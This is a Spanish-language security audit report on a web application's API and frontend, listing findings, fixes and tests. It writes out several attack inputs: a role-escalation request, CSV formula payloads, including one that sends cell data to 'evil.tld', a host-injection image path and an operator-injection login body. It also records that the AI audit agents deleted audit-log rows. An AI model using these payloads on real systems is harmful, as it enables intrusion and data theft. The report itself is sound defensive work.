# Auditoría de seguridad y corrección — 8 de agosto de 2026

Dos rondas, ocho lentes adversariales sobre `api/` y `web/`. Todo lo que sigue está
**verificado**: ejecutado contra el servidor local, medido contra `osefi_local`, o
leído en el código. Lo que no se pudo probar va marcado.

Una tercera ronda intentó **refutar** los nueve hallazgos principales de la segunda.
No cayó ninguno; varios resultaron peores de lo reportado.

> **Estado a 19 de agosto de 2026.** Los puntos **1, 2 y 7 están cerrados**, y el 8
> también como efecto secundario del 2. Los otros seis siguen abiertos. Cada punto
> lleva su estado en la cabecera.
>
> El 2 no se cerró como estaba planteado. La matriz de permisos que la interfaz ya
> tenía se mudó a la base de datos, el servidor la hace cumplir y hay una pantalla
> para editarla. Ver **F. La matriz de permisos** al final.

---

## A. Seguridad — orden de parcheo

Del que hace irrelevantes a los demás hacia abajo.

### 1. Cualquier usuario autenticado se hace administrador — ✅ CERRADO (18 ago 2026)

`api/src/controllers/usuario.controller.ts:101`

```ts
TempUsuario.set(req.body);   // el cuerpo entero, sin filtrar
await TempUsuario.save();
```

`PUT /api/usuario/:id` está tras `requireSelfOrRole(ADMIN)`, que deja pasar a
cualquiera **para su propia fila**. `id_rol` es un atributo del modelo, así que:

```
PUT /api/usuario/<mi_id>   {"id_rol": 1}   →  200
```

Surte efecto en la petición siguiente, con el mismo token, porque `app.ts:89-93`
relee el rol de la base en cada llamada. Ejecutado por tres agentes distintos.

Y es **la forma que la app ya envía**: `web/src/pages/menu/PerfilPage.tsx:83` arma
el cuerpo como `{...user, …}`, y `user` lleva `id_rol` dentro. Un `fetch()` de dos
líneas en la consola del navegador basta.

La misma línea abre cinco agujeros más:

| | |
|---|---|
| Contraseña **sin pedir la anterior** | `updateUserPass` sí la exige a los no administradores; esta ruta no exige nada. Robar una sesión se convierte en quedarse la cuenta para siempre — y se registra como "Editó perfil"/`warning`, no como `CHANGE_PASSWORD`/`critical` |
| Contraseña en claro | `{"pass":"x"}` se guarda literal, sin bcrypt. La cuenta queda inutilizable |
| Hash filtrado en la respuesta | `res.json(TempUsuario)` devuelve `pass`. Ocurre en `updateUsuario`, `updateUserName` y `updateUserPass`. Las lecturas sí lo excluyen |
| Hash **y contraseña nueva** en la bitácora | Verificado: `bitacoras.metadata` llegó a contener `{"after":{"pass":"…"},"before":{"pass":"$2a$08$…"}}` |
| Secuestro de nombre de usuario | No hay índice único en `usuarios.user`. `updateUserName` comprueba colisiones; `updateUsuario` no. Dos filas con el mismo usuario y `loginUsuario` hace `findOne` sin orden |

**Arreglo aplicado.** `editableFrom()` en `usuario.controller.ts` construye el parche
a partir de una lista blanca `["name","lastname","birthday","image","phone"]`, más
`id_rol` solo si quien llama es administrador. Lo que no está en la lista se descarta
sin más: `user` y `pass` tienen sus propias rutas, con sus propias comprobaciones.

Un no administrador que mande su `id_rol` **actual** pasa sin ruido — la página de
perfil devuelve el objeto entero y eso es tráfico normal. Pedir uno **distinto** es un
403 y una línea `ROLE_CHANGE_DENIED`/`critical` en la bitácora.

De los cinco agujeros de la tabla, la lista blanca cierra cuatro: contraseña sin la
anterior, contraseña en claro, contraseña en la bitácora y secuestro de nombre de
usuario — ninguno de esos campos llega ya al `set()`. El quinto, el hash en la
respuesta, se cerró aparte: `withoutPass()` lo quita en `updateUsuario`,
`updateUserName` y `createUsuario`.

Sigue faltando el índice único en `usuarios.user`: hoy nada impide dos filas con el
mismo nombre si se crean por otra vía. Es una migración, no está hecha.

**Pruebas:** seis en `usuario.controller.test.ts`, bajo *"what a request may actually
change"*. Comprobado que las seis fallan contra el código anterior y pasan contra el
nuevo — no es una prueba que acompañe al arreglo sin comprobar nada.

### 2. Cincuenta y una escrituras sin puerta de rol — ✅ CERRADO (19 ago 2026)

Doce routers montados con `authenticateToken` y nada más: `adss`, `ciudad`, `evento`,
`material`, `obs`, `poste`, `propietario`, `revision`, `solucion`, `tipoObs`, `rol`,
`upload`. Probados los doce con un token de rol 3: **ni un solo 403**. `reporte` es el
decimotercero: seis `PUT` que en realidad son consultas.

La cifra ya no es una estimación. `api/src/routes/routeGuards.test.ts` recorre la app
tal y como Express la montó — viendo las puertas estén donde estén, dentro del router
o en el `app.use` — y las cuenta: **51 rutas de escritura** que cualquier sesión puede
llamar, listadas una por una en la constante `UNGATED_PENDING_DECISION`.

Esa lista está pensada para **encoger hasta cero**. El test falla de tres formas: si
aparece una ruta de escritura nueva sin puerta y sin decidir, si una de la lista ya
está protegida y nadie borró su línea, y si la lista crece. Lo que no hace es fallar
por las 51 que ya conocemos — dejar la suite en rojo indefinidamente no protege nada.

**Arreglo aplicado.** Ninguna ruta de escritura queda sin puerta salvo dos, y las
dos están justificadas por escrito en su propio router: iniciar sesión (es lo que
produce el permiso) y subir una imagen (sirve a tres pantallas, una de ellas tu
propia foto de perfil). El test `routeGuards.test.ts` falla si aparece una tercera.

Comprobado sobre el servidor en marcha con las tres cuentas reales: 39 peticiones,
todas respondieron lo que la matriz dice. Un Cliente recibe 403 en las catorce.

**Quién debería poder qué**, según la bitácora (no según mi intuición) — y esto es
exactamente lo que la matriz ya decía:

| | rol 1 Administrador | rol 2 Coordinador | rol 3 Cliente |
|---|---|---|---|
| Crear/editar eventos, postes, revisiones, soluciones | sí | **sí** | nunca |
| Crear/editar ciudades, observaciones, tipos, materiales | sí | no consta | nunca |
| Borrar / desarchivar cualquier cosa | sí | **nunca ha borrado nada** | nunca |
| Roles (`/api/rol`) | sí | nunca | nunca |
| Generador de reportes | sí | sí | sí (ya cerrado) |

Las únicas escrituras de rol 3 en toda la bitácora son de `Diego` el 4 de agosto y de
mis dos usuarios de auditoría el 8. Historia real de rol 3: iniciar sesión y nada más.

La grave es **`DELETE /api/rol/:id`**. `rol` es el único modelo sin `paranoid`, y las
17 claves foráneas de la base son `ON DELETE CASCADE`. Medido con `BEGIN … ROLLBACK`:

| Borrar | usuarios | postes | eventos | revisiones | soluciones | bitácoras |
|---|---|---|---|---|---|---|
| rol 1 | 3 | 362 | 385 | 1.430 | 217 | 3.179 |
| **rol 2** | 6 | **958** | **924** | **4.835** | **700** | 205 |

Sin borrado suave y sin rastro: las filas de bitácora las borra la misma cascada.

El resto de las 51 **sí** es recuperable — todos los demás modelos son `paranoid` y
ningún controlador pasa `force: true`.

### 3. Destrucción irreversible de fotografías

`evento.controller.ts:292-294`, y el mismo patrón en `poste:254`, `ciudad:40`,
`solucion:56`, `usuario:104`, más `evento:333` (reabrir destruye la foto de solución
mientras la fila solo se archiva).

Cambiar `image` hace `fs.unlink` del valor anterior. Dos peticiones por fotografía,
ejecutado. Los nombres se enumeran desde cualquier lectura, que rol 3 tiene abierta.

El daño está **acotado a `IMAGES_DIR`**: `utils/fileUtils.ts:19-41` resiste todos los
intentos de travesía. No es borrado arbitrario en el host.

### 4. Errores crudos de Postgres al cliente

~86 sitios con `res.status(500).json({ message: error.message })` en 20 controladores.
Filtran nombres de tabla, de columna, de restricción, y rutas absolutas del sistema de
ficheros. El frontend los pinta en un toast. `generador.controller.ts:39-64` es el
único que los limpia, y explica por qué.

### 5. El limitador de login se salta rotando `X-Forwarded-For`

`app.ts:53` (`trust proxy: 1`) más la clave por defecto `req.ip`. Probado: cabecera
fija → el contador baja 9→8→7; cabecera rotada → `RateLimit-Remaining: 9` siempre.
Sin bloqueo por cuenta. Además, usuario inexistente responde distinto **y más rápido**
(no llega a ejecutar bcrypt) que contraseña incorrecta.

El limitador del generador lo hace bien —clave por usuario y plegado IPv6— y es del
que hay que copiar.

### 6. Inyección de fórmulas en los seis exportadores CSV del navegador

`ReportRecorrido.tsx:85` envuelve en comillas y **no las duplica**, así que una comilla
rompe el campo y el atacante controla cuántas columnas tiene la fila. Los otros cinco
(`reportGeneral.ts:422`, `reportTramo.ts:381`, `evento/index.tsx:150`,
`poste/index.tsx:144`, `SeguridadPage.tsx:182`) escapan bien las comillas pero no
miran el primer carácter: `=cmd|'/c calc'!A1` sale sin comillas y es fórmula viva.

Cadena de ataque completa: `SeguridadPage` exporta `name`, `lastname`, `user` y `phone`
— campos que cualquiera edita sobre sí mismo. Un rol 3 se pone de apellido
`=HYPERLINK("https://evil.tld/?d="&A1,"clic")` y espera a que un admin exporte.

Los **Excel no son vulnerables**: ExcelJS escribe las cadenas como texto compartido.

### 7. `DB_SYNC` puede alcanzar producción — ✅ CERRADO (19 ago 2026)

`api/.env` tiene `DB_SYNC=true` junto a la cadena de Render. `database/sequelize.ts`
cae a `DATABASE_URL` cuando faltan las `PG_*`, e `index.ts:24` lee `DB_SYNC` sin mirar
`NODE_ENV`. Comentar `PG_DATABASE` para depurar cinco minutos y arrancar reescribe el
esquema de producción con `sync({ alter: true })`.

Lo dejé yo puesto, trabajando en este proyecto. La atribución que había aquí antes
era mía y era errónea.

**Arreglo aplicado.** Pedirlo ya no basta. `sequelize.ts` ahora exporta de dónde
salió la conexión, y `index.ts` solo sincroniza si además viene de las `PG_*` — que
es la forma de una base local. Una `DATABASE_URL` es la forma de una base alojada y
se rechaza diga lo que diga la bandera, con un mensaje que explica por qué. La
bandera también quedó en `false` en `.env`, pero eso es lo de menos: apagar un
interruptor no es cerrar un agujero, y el arreglo es la guarda.

### 8. El rol del cliente no se refresca nunca — ✅ CERRADO (19 ago 2026)

**Arreglo aplicado**, como efecto del punto 2. `GET /api/login` devolvía el contenido
del propio token, que es una foto del día que la persona entró; los tokens duran una
semana. Ahora lee el usuario de la base y devuelve su rol y sus permisos actuales, y
si la cuenta fue archivada entretanto la sesión se corta.

`web/src/context/SesionProvider.tsx:104-111` guarda el token renovado pero no toca
`sesion.usuario`, de donde `RoleRoute`, `PermissionGuard` y todos los `can(...)` leen
el rol. Degradar a alguien no le quita nada hasta que pulse F5 — **hasta siete días**.
Con la API sin puertas, esos botones siguen funcionando.

### 9. Las imágenes se sirven sin autenticar

`app.ts:116` monta `express.static` en la raíz, antes de `authenticateToken`. Probado
sin cabecera `Authorization`: `GET /1773397535880_shreck.jpg` → 200, 75 KB. Los nombres
son `<epoch>_<nombre original del cliente>` y viajan en cualquier respuesta de la API.

### 10. Secretos

- `JWT_SECRET` son once letras minúsculas con forma de nombre propio. Quien lo adivine
  firma un token para el id que quiera; `authenticateToken` confía en el `id` del token
  y solo relee el rol. Está también en `.env.docker`.
- `VITE_ORS_API_KEY` viaja en el bundle — confirmado, aparece 4 veces en
  `web/dist/assets/index-*.js`. Solo se arregla haciendo de proxy desde la API.
- `VITE_MUI_LICENSE_KEY` está muerto: MUI no es dependencia. Borrarlo.
- `api/.env` tiene la cadena de producción de Render con su contraseña. Está en
  `.gitignore` y nunca se commiteó, pero es una credencial viva en el árbol de trabajo.
- Los tokens **no se pueden revocar**: el servidor refirma uno de 7 días en cada
  petición, así que un token robado se renueva solo con usarlo. `logout()` solo borra
  el `localStorage`. Cambiar la contraseña tampoco lo invalida.
- Sin `helmet`: no hay `X-Frame-Options`, ni CSP, ni HSTS.
- Contraseñas sin política de longitud ni complejidad. bcrypt con coste 8.

---

## B. Los números que lee el cliente están mal

Esto es aparte de la seguridad, y para Fisher pesa más.

| Pantalla | Qué muestra | Qué es verdad |
|---|---|---|
| **Tiempos de Resolución** | 60 días de promedio | **25 días.** Mide desde `createdAt`, que es cuándo se cargó la fila |
| **Tiempos, columna Mínimo** | 63 de 85 tramos en "0d", pintados de verde | El `GREATEST(0,…)` aplasta a cero el 35% de los eventos, que dan negativo |
| **Estado de la Red** | "100% de salud, 0 pendientes" en los 91 tramos | Un periodo sin revisiones deja la lista de ids vacía → `IN (NULL)` → salen todos los postes sin eventos. **Un "todo en orden" falso** |
| **Reporte General** | "277 críticos" en un reporte de abril | Eventos con ≥5 revisiones *dentro* de abril: **cero**. La columna de revisiones es de toda la vida; el 86% de las filas muestra fechas fuera del mes |
| **Exportados** | 38% de los resueltos pintados de rojo | El color mira si hay foto de solución, no `state`. La columna de al lado, en la misma fila, dice "Solucionado" |
| **Observaciones Frecuentes** | +10% global, +33% en filas concretas | Cuenta observaciones de eventos archivados |
| **Estado de la Red y Tiempos** | Un tramo partido en dos y una ciudad llamada `#76` | La ciudad 76 está archivada y el `LEFT JOIN` paranoid anula su nombre |
| **`getAdssStats`** | "Más asociado: 1.270 — Duplo" | 1.149. Cuenta vínculos de postes archivados |

Dos más, de rendimiento: el dashboard **envía 1,22 MB de JSON** —la base entera— y
calcula los catorce KPIs en el navegador; y la exportación del cliente hace **~2.000
peticiones HTTP secuenciales** para las fotos.

**Ojo:** el reporte de tiempos está *fijado* por `regression.test.ts:158-195`, que
exige que el generador nuevo dé el mismo número. Arreglarlo rompe esa prueba a
propósito, y le baja a Fisher la media a menos de la mitad. Es decisión suya.

---

## C. Lo que aguantó

Merece decirse, porque no todo está mal:

- **No se pudo romper la inyección SQL** del generador: más de treinta cargas hostiles.
- **No hay XSS alcanzable.** El payload guardado en `description` se renderiza como
  texto literal en los once sitios donde aparece. No hay `eval`, `new Function`,
  `innerHTML`, `document.write` ni `window.open` con datos en todo `web/src`.
- **La travesía en la subida no existe.** Dos agentes la declararon explotable y los
  dos se equivocaron: `busboy/lib/utils.js:479` aplica `basename` sobre `/` y `\`, y
  multer no pasa `preservePath`. Está a salvo por una dependencia, no por código
  nuestro — un `path.basename` en el controlador lo haría explícito.
- **`resolveImagePath` es sólido**: rechaza separadores, `..`, letras de unidad y NUL,
  y revalida la contención.
- **El CORS es estricto**, un solo origen, sin reflejar. El token va en cabecera, así
  que CSRF no aplica.
- **El rol se relee de la base en cada petición**: archivar o degradar surte efecto
  inmediato del lado del servidor.
- La zona horaria de los reportes antiguos es correcta, no hay multiplicación de filas,
  y el filtrado de archivados está bien salvo en los dos sitios listados arriba.
- El `localStorage` solo guarda el token, el tema y el ancho de la barra. La consola
  está limpia en producción.
- **El módulo del generador es la única parte de la API con la autorización bien
  hecha**: puerta de rol, catálogo recortado por rol, propiedad por fila, y revalidación
  con el rol de quien actúa al guardar, editar y duplicar.

---

## D. Estado de la base tras la auditoría

Los agentes tuvieron permiso de escritura y hay que decirlo: crearon usuarios, ciudades
y un evento de prueba en `osefi_local`. Uno hizo un `DELETE` sin rollback sobre un rol,
y otro borró filas de bitácora —incluidas las de un agente hermano— al limpiar lo suyo.

Verificado al cerrar: roles originales (1 Administrador, 2 Coordinador, 3 Cliente),
1.514 eventos, 1.687 postes, 99 ciudades, 7.741 revisiones, 1.071 soluciones, 17
ficheros en `C:/images`. **Nada de Isaias se perdió.** Quedan dos usuarios de prueba
archivados, `zz_audit_refute_a` y `_b`, sin borrar porque hacerlo dispararía la misma
cascada que denuncia el punto A.2.

La bitácora tiene huecos entre las filas 3397 y 3441.

---

## E. Sobre el evento #2310 y el usuario Diego

Aparecía en la bitácora un rol 3 cambiando la imagen de un evento a
`.evil.example/x.jpg` el 4 de agosto. **Fue una prueba del equipo**, con evidencia:
los reportes creados en esos minutos se llaman `AUDIT shared by staff` y uno lleva
`description = "Creado por la verificación automática"`; hubo 44 `RUN_REPORTE` en 255
milisegundos y tres `UPDATE_EVENTO` con tres roles distintos en 36; y el administrador
lo revirtió 86 segundos después.

El evento está intacto: `image = /1778185422691_Imagen1.webp`, `id_poste = 2419`.

**Dos cosas que se reportaron mal en su momento y conviene no repetir:**

1. Se dijo que `id_poste` había quedado en `null`. Es falso — salía de la bitácora, y
   la bitácora mentía por un fallo del registro que anotaba cambios que no ocurrieron.
   Ese fallo ya está arreglado en `evento.controller.ts:250-262`, pero **las filas
   viejas siguen ahí** y el mismo fallo sigue vivo en `usuario.controller.ts:93`, que
   anota "rol eliminado" en cada guardado parcial de perfil.
2. El payload era más fino de lo que parecía. El punto inicial de `.evil.example` es
   deliberado: el frontend concatena `` `${url}${image}` `` **sin separador**, así que
   se convierte en `https://lefitel-backend.onrender.com.evil.example/x.jpg` — un host
   del atacante. Es **inyección de host**, no "una URL externa". Hay un `imageUrl()` en
   `web/src/lib/imageUrl.ts` que documenta este ataque exacto y lo arregla, usado en
   **2 de 16** sitios.

Qué distinguiría un incidente real de una prueba, si vuelve a pasar: que **no** haya
reversión, que **no** haya artefactos etiquetados `AUDIT`, o que el dominio resuelva.
Y un dato incómodo: **3.396 de 3.406 filas de la bitácora no tienen IP**. Ninguna
edición de datos registra de dónde vino.

---

## F. La matriz de permisos

Lo que se construyó el 19 de agosto para cerrar el punto 2, que resultó más grande
de lo que el punto decía.

### El hallazgo que cambió el plan

La matriz que hacía falta **ya existía**, en `web/src/lib/permissions.ts`: por módulo
y por acción, usada en 57 sitios de la interfaz, y coincidiendo con lo que la bitácora
dice que cada rol hace de verdad. Pero vivía en el navegador, donde no es una regla
sino una sugerencia — es código que corre en la máquina del usuario.

Además la pantalla de Seguridad deja crear roles, y la matriz solo conocía tres. Un
cuarto rol nacía sin permisos y sin ninguna pantalla donde dárselos: el botón de crear
rol fabricaba usuarios inservibles.

### Cómo quedó

| Pieza | Dónde |
|---|---|
| Tabla `permisos` | rol × módulo × acción → sí/no. 120 filas: 3 roles, 10 módulos, 4 acciones |
| Migración | `20260818000001-create-permisos` — crea y rellena con la matriz que ya había. Reversible |
| Vocabulario | `api/src/permissions/matrix.ts` — los nombres que comparten tabla, rutas y pantalla |
| Lectura | `api/src/permissions/store.ts` — en memoria, 60 s de caché, se invalida al guardar |
| Puerta | `requirePermission(modulo, accion)` en cada ruta |
| Propiedad | `requireSelfOrPermission` — "es tu propia ficha" no es un permiso de rol y no tiene casilla |
| API | `GET /permisos/mias`, `GET /permisos`, `PUT /permisos/:id_rol` |
| Pantalla | `web/src/components/PermisosPanel.tsx`, pestaña Permisos en Seguridad |

**`roles` es un módulo aparte de `seguridad`** a propósito. Si "editar usuarios" y
"asignar roles" fueran el mismo permiso, dar edición al Coordinador le dejaría hacerse
Administrador — el mismo agujero del punto 1 por otra puerta.

**Nadie puede editar los permisos de su propio rol.** Es el único error sin vuelta
atrás: quitarte a ti mismo el acceso a esa pantalla la cierra para todos. Se responde
409 y se explica. Editar el rol de otro administrador sigue funcionando, así que la
salida existe mientras haya dos.

**Lo que falte se niega.** Un rol sin filas, un módulo que nadie concedió, la tabla sin
migrar todavía: todo eso es "no".

### Lo que no cubre

La columna **`ver` no filtra las lecturas de la API todavía**. Gobierna qué pantallas
ofrece la interfaz y qué módulos administrativos (bitácora, archivos, seguridad, roles)
responden. Pero `GET /api/material` sigue abierto a cualquier sesión, y a propósito: un
Cliente que mira un evento necesita leer los tipos de observación para que la pantalla
tenga sentido. Cerrar las lecturas es una decisión aparte, con su propia superficie de
rotura, y no está tomada.

### Comprobado

- 315 pruebas en `api`, 114 en `web`. `routeGuards.test.ts` falla si aparece una ruta
  de escritura nueva sin puerta.
- El typecheck ahora incluye los tests (`tsconfig.test.json`). Antes los excluía, así
  que un test que no compilaba solo se descubría al ejecutarlo.
- Sobre el servidor en marcha, con las tres cuentas reales y tokens fabricados: 39
  peticiones, todas respondieron lo que la matriz dice.

### Dos cosas que encontré por el camino

**`requireSelfOrRole` leía `req.params.id`, pero la ruta de bitácora usa
`:id_usuario`.** Comparaba contra `undefined`, así que "un usuario puede ver su propia
actividad" nunca funcionó: siempre 403. Corregido — el middleware ahora recibe el
nombre del parámetro.

**Archivar algo que no existe responde 200 y escribe en la bitácora que se archivó.**
`DELETE /api/evento/999999` devuelve 200 y deja la línea `DELETE_EVENTO` con
`entity_id: 999999`. Los controladores no miran cuántas filas tocó el `destroy`. No es
un agujero de seguridad, pero es un registro de auditoría que miente. Sin arreglar.

---

## G. Los logs del servidor

Cambiado el 19 de agosto. No arregla ningún punto de la auditoría; entra aquí porque
una de sus decisiones sí es de seguridad.

`morgan("dev")` imprimía método, ruta y estado. El logger de Sequelize imprimía cada
consulta. Todo lo demás eran 18 `console.log` sueltos. Sin niveles, sin forma de saber
qué líneas pertenecen a qué petición, y en producción sin forma de buscar nada.

Ahora es **pino**. Una línea por evento: en desarrollo con colores y campos legibles,
en producción JSON, que es lo que convierte "todos los errores del usuario 14" en una
búsqueda y no en una tarde de lectura.

| | |
|---|---|
| `utils/logger.ts` | El logger. Nivel por `LOG_LEVEL`, `info` por defecto, `silent` bajo vitest |
| `middleware/httpLogger.ts` | Una línea por petición, con identificador |
| `log("db")`, `log("boot")`, … | Etiqueta de origen en cada línea |

**Lo relevante para la seguridad: la redacción.** La sesión deslizante reemite un JWT
en la cabecera `x-new-token` de **cada respuesta**. Un log de respuestas sin filtrar
habría dejado una credencial válida en disco por cada petición que el servidor haya
atendido — un agujero nuevo, creado por mejorar los logs. Se redactan esa cabecera, la
de `authorization`, las cookies y cualquier campo llamado `pass`, `oldPass`,
`password` o `token`, esté donde esté. Lo hace el logger, no el sitio que llama, y hay
cuatro pruebas en `logger.test.ts` que fallan si alguien lo quita.

**El SQL pasó a `debug`.** Antes se imprimía siempre y una carga de página tapaba
cualquier cosa interesante. Con `LOG_LEVEL=debug` vuelve.

**No confundir con la bitácora.** Esa es el registro de negocio: va a la base de datos,
dice quién archivó qué, y lo lee el cliente. Este es técnico, va a la salida estándar
y lo lees tú. Son dos cosas y no deben mezclarse.

### Dos fallos que salieron al probarlo

**El puerto ocupado mataba el arranque con un volcado de pila.** `app.listen` avisa de
sus fallos por evento, no rechazando la promesa, así que el `catch` del arranque no los
veía. Ahora dice "el puerto 3000 ya está ocupado" y qué hacer.

**Cada error se registraba dos veces**, una por `pino-http` con el identificador de
petición y otra por el manejador de errores de `app.ts` sin él — parecían dos fallos
distintos. El manejador ya no registra, solo da forma a la respuesta.

---

## H. El login y los espacios

Cambiado el 21 de agosto, a raíz de una pregunta de Isaias: el formulario dejaba
escribir espacios en usuario y en contraseña.

La respuesta no es la misma para los dos campos, y confundirlos es un error clásico.

**El usuario pierde los espacios de los extremos.** Quien pega su nombre y arrastra un
espacio detrás recibía "usuario inexistente" sin nada que explicara por qué. Se recorta
en el navegador (`LoginPage.tsx`, al enviar y al salir del campo) **y** en el servidor
(`login.controller.ts`), porque lo primero se puede saltar.

**Los espacios de en medio se quedan.** `Omar Mita`, id 12, es una cuenta real de la
base. Prohibir los espacios en vez de recortar los extremos le habría dejado fuera.
Recortar no es quitar.

**También al crear y al renombrar.** Ahí está el daño de verdad: un administrador podía
crear `" Diego "` y esa persona no habría podido entrar nunca, porque escribiría
`Diego` y la búsqueda no coincidiría. Silencioso e indepurable desde la pantalla.

**La contraseña no se recorta.** Es la parte contraintuitiva y es deliberada: un espacio
es un carácter válido en un secreto. Recortarlo aceptaría una contraseña distinta de la
elegida, reduciría lo que hay que adivinar, y dejaría fuera a quien tenga una que
empiece o acabe en espacio — imposible de saber, están cifradas. Lo único que ignora
los espacios es la comprobación de "¿has escrito algo?".

**Y una entrada que no era texto.** `loginUsuario` leía `req.body.user` sin comprobar el
tipo. Sequelize interpreta un objeto en el `where` como condiciones, así que un cuerpo
como `{"user": {"ne": null}}` es de la familia que no debe llegar a la consulta. Ahora
se rechaza cualquier cosa que no sea texto, en los dos campos.

### Pruebas

`login.controller.test.ts`, 10 pruebas. El login no tenía ninguna, siendo la puerta de
entrada. Una fija explícitamente que la contraseña se compara tal cual, para que nadie
la "limpie" en el futuro creyendo que ayuda.

### Sin arreglar, documentado en una prueba

El servidor responde **"Usuario inexistente"** o **"Contraseña incorrecta"** según el
caso, lo que le dice a quien pruebe qué nombres de usuario existen. La última prueba
del fichero deja constancia de que hoy los mensajes difieren; el día que se unifiquen,
esa prueba falla y hay que cambiarla por una igualdad. No se arregló porque unificar
empeora un poco el mensaje para quien se equivoca de buena fe, y esa es una decisión
de producto.

### Aparte: el logo del login en móvil

`LoginPage.tsx` llevaba `dark:invert` en el logo de la versión móvil, que invierte cada
color por su complementario en modo oscuro. Es un truco válido para logos en blanco y
negro y erróneo para uno con colores de marca. La versión de escritorio nunca lo tuvo,
así que además no coincidían. Quitado.

